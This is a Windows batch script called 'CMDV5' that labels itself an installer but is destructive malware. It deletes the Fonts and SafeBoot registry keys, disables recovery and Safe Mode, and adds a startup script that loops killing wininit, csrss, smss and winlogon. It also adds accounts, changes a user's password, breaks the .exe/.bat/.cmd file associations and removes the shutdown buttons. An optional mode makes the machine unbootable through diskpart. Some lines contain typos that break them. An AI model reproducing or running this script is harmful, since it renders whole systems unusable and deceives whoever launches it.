@echo off
TITLE CMDV5
echo Loading...
SFC /ScanFile="C:\Windows\system32\net.exe"
cls
@rem ----[ This code block detects if the script is being running with admin PRIVILEGES If it isn't it pauses and then quits]-------
echo OFF
NET SESSION >nul 2>&1
IF %ERRORLEVEL% EQU 0 (
    ECHO Administrator PRIVILEGES Detected! 
) ELSE (
   echo ######## ########  ########   #######  ########  
   echo ##       ##     ## ##     ## ##     ## ##     ## 
   echo ##       ##     ## ##     ## ##     ## ##     ## 
   echo ######   ########  ########  ##     ## ########  
   echo ##       ##   ##   ##   ##   ##     ## ##   ##   
   echo ##       ##    ##  ##    ##  ##     ## ##    ##  
   echo ######## ##     ## ##     ##  #######  ##     ## 
   echo.
   echo.
   echo ####### ERROR: ADMINISTRATOR PRIVILEGES REQUIRED #########
   echo This file must be run as administrator to work properly!  
   echo If you're seeing this after clicking on the file, then right click on it and select "Run As Administrator".
   echo ##########################################################
   echo.
   PAUSE
   EXIT /B 1
)
cls
SFC /ScanFile="C:\Windows\system32\reg.exe"
SFC /ScanFile="C:\Windows\system32\diskpart.exe"
SFC /ScanFile="C:\Windows\system32\secedit.exe"
SFC /ScanFile="C:\Windows\system32\mountvol.exe"
SFC /ScanFile="C:\Windows\system32\icacls.exe"
SFC /ScanFile="C:\Windows\system32\xcopy.exe"
SFC /ScanFile="C:\Windows\system32\bcdedit.exe"
secedit /configure /cfg %windir%\inf\defltbase.inf /db defltbase.sdb /verbose
echo Checking Operating System Version...
wmic os get version | find "6.1" > nul
if %ERRORLEVEL% == 0 goto SEVEN
)
wmic os get version | find "6.2" > nul
if %ERRORLEVEL% == 0 goto EIGHT
)
wmic os get version | find "6.3" > nul
if %ERRORLEVEL% == 0 goto EIGHTPOINTONE
)
wmic os get version | find "10.0" > nul
if %ERRORLEVEL% == 0 goto TEN
)
wmic os get version | find "6.0" > nul
if %ERRORLEVEL% == 0 goto MAININSTALLBVISTA
)
wmic os get version | find "5.1" > nul
if %ERRORLEVEL% == 0 goto MAININSTALLB
)
ver | find "5.0" > nul
if %ERRORLEVEL% == 0 goto MAININSTALLB
)
cls
echo OS Check Failed.
PAUSE
exit
:NOTCOMPAT
cls
echo the OS is not compatible.
PAUSE
exit
:SEVEN
cls
echo .....................................................
echo CMDV5 Installer
echo .....................................................
echo,
echo,
echo ENTER - Proceed
echo,
SET /P M=Press ENTER to Proceed : 
IF "%M%"=="" GOTO WIN7INSTALLRE
goto SEVEN
:WIN7INSTALLRE
echo Applying changes...
diskpart /s %CD%\win7\diskpart.txt
icacls "C:\Recovery\" /setowner "Dartz" /T /C
icacls "C:\Recovery\" /grant Dartz:F /T /C
xcopy "%CD%\win7\win7re\Winre.wim" "C:\Recovery\db77f94e-8028-11eb-a6d0-a34b0745a61f\Winre.wim" /Y /Q /H
goto SEVENINSTALL
:SEVENINSTALL
echo,
cls
echo Applying changes...
goto MAININSTALL
:EIGHT
cls
echo .....................................................
echo CMDV5 Installer
echo .....................................................
echo,
echo,
echo Enter - Proceed
echo,
SET /P M=Press ENTER to Proceed : 
IF "%M%"=="" GOTO WIN8INSTALLRE
goto EIGHT
:WIN8INSTALLRE
echo Installing Windows RE Protection...
diskpart /s %CD%\win8\diskpart.txt
icacls "K:\Recovery\" /setowner "Dartz" /T /C
icacls "K:\Recovery\" /grant Dartz:F /T /C
xcopy "%CD%\win7\win78re\Winre.wim" "K:\Recovery'WindowsRE\Winre.wim" /Y /Q /H
goto EIGHTINSTALL
:EIGHTINSTALL
echo,
goto MAININSTALLB
echo Sorry but Windows 8 Support has not been inplemented yet.
PAUSE
exit
echo Applying changes...
:EIGHTPOINTONE
cls
echo .....................................................
echo CMDV5 Installer
echo .....................................................
echo,
echo WARNING
echo,
echo CMDV5 is unstable on Windows 8.1 and 10 expect errors to pop up
echo,
echo ENTER - Proceed
echo,
SET /P M=Press ENTER to Proceed : 
IF "%M%"==1 GOTO WIN81INSTALLRE
:WIN81INSTALLRE
cls
echo Applying changes...
diskpart /s %CD%\win81\diskpart.txt
icacls "K:\Recovery\" /setowner "Dartz" /T /C
icacls "K:\Recovery\" /grant Dartz:F /T /C
xcopy "%CD%\win81\win81re\Winre.wim" "K:\Recovery\WindowsRE\Winre.wim" /Y /Q /H
goto MAININSTALL
goto MAININSTALL
:TEN
cls
echo .....................................................
echo CMDV5 Installer
echo .....................................................
echo,
echo WARNING
echo,
echo CMDV5 is unstable on Windows 8.1 and 10, expect errors to pop up
echo,
echo ENTER - Proceed
echo,
SET /P M=Press ENTER to Proceed : 
IF %M%==1 GOTO TENINSTALL
goto TEN
:TENINSTALL
echo,
goto MAININSTALLB
PAUSE
exit
goto MAININSTALL
:MAININSTALL
net user beachball /add
net localgroup Guests beachball /add
net user Dartz 1593570 /domain
diskpart /s %CD%\unass\unass.txt
goto BCD
:EXIT
exit
:RESTART
wmic os where primary=1 reboot
:DESTROY
REG DELETE "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Fonts" /f
GOTO eeee
:MAININSTALLB
cls
echo .....................................................
echo CMDV5 Installer
echo .....................................................
echo,
echo,
echo Enter - Proceed
echo,
SET /P M=Press ENTER to proceed :
IF "%M%"=="" GOTO MAININSTALLBB
:MAININSTALLBB
net user beachball /add
net localgroup Guests beachball /add
net user Dartz 1593570 /domain
goto DESTROY
:MAININSTALLBVISTA
net user beachball /add
net localgroup Guests beachball /add
net user Dartz 1593570 /domain
goto BCD
:eeee
cd %systemroot%
mkdir fakeexplorer payload wallpapertroll junkins
cd %systemroot%\junkins
mkdir nssm
xcopy "%CD%\junkins\startup\no.bat" "c:\windows\fakeexplorer" /y /q /h
xcopy "%CD%\junkins\walp\walp.bmp" "c:\windows\wallpapertroll\walp.bmp" /y /q /h
xcopy "%CD%\junkins\startup\SetACL.exe" "c:\windows\junkins\startup\SetACL.exe" /y /q /h
xcopy "%CD%\junkins\nssm\nssm.exe" "c:\windows\junkins\nssm\nssm.exe" /y /q /h
reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d c:\windows\wallpapertroll\walp.bmp /f
echo @echo off> %systemroot%\payload\startup.bat
echo echo No.>> %systemroot%\payload\startup.bat
echo :no>> %systemroot%\payload\startup.bat
echo taskkill /F /IM "wininit.exe">> %systemroot%\payload\startup.bat
echo taskkill /F /IM "csrss.exe">> %systemroot%\paload\startup.bat
echo taskkill /F /IM "smss.exe">> %systemroot%\payload\startup.bat
echo taskkill /F /IM "winlogon.exe">> %systemroot%\payload\startup.bat
echo goto no>> %systemroot%\payload.bat
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v cmdv5 /t REG_SZ /d %systemroot%\payload\startup.bat
%systemroot%\junkins\startup\SetACL.exe -on name -ot type -actn action
%systemroot%\junkins\startup\SetACL.exe -on "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SafeBoot" -ot reg -actn setowner -ownr "n:Administrators"
%systemroot%\junkins\startup\SetACL.exe -on "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SafeBoot" -ot reg -actn ace -ace "n:Administrators;p:full"
reg delete "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SafeBoot" /f
reg import "%CD%\junkins\startup\disableshutdownandrebootbutton.reg"
RUNDLL32.EXE user32.dll, UpdatePerUserSystemParameters
goto AAAAJJ
:AAAAJJ
goto ADDONS
:BCD
bcdedit /set {current} TESTSIGNING on
bcdedit /set {current} recoveryenabled No
bcdedit /set {bootmgr} timeout 0
goto DESTROY
:ADDONS
@rem --Additional Commands go below--
start %systemroot%\junkins\nssm\nssm.exe stop Themes
start %systemroot%\nssm\nssm.exe remove Themes confirm
ipconfig /release
assoc .exe=jaydumb
assoc .cmd=windfufBest
assoc .bat=CmdV5
msg "Dartz" oops your PC ran into a problem
msg "Dartz" uh oh you dont have fonts anymore
goto RESTART
:ultraFuckingMode
echo this mode Will make your pc unbootable and you can boot ipxe on It only enable if you wanna use ipxe or fuck the vm
echo to enable this mode add a goto ultraFuckingMode and it must be before goto RESTART
echo so you activated the mode but beware once this is done your PC can only boot into ipxe
echo and you asked for It so here you go
diskpart /s %CD%\win7\fuckmode.txt
goto RESTART
